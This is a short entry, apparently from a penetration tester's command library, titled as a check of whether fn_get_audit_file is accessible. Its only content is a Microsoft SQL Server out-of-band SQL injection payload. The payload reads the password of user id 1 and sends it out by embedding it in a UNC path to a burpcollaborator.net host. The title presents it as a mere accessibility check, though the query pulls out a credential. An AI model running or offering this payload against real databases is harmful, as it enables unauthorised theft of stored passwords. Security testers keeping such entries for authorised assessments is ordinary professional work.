---
id: 09211511-5d2e-45d0-bc76-4c8d3145e323
name: Check if fn_get_audit_file is accessible
type: command
executor: bash
data: select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from
  users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default))
output: null
created_at: '2023-04-06T03:56:34.004269+00:00'
updated_at: '2023-04-10T20:22:40.529149+00:00'
---

# Check if fn_get_audit_file is accessible

```bash
select 1 where exists(select * from fn_get_audit_file('\\'%2b(select pass from users where id=1)%2b'.xxxx.burpcollaborator.net\',default,default))
```


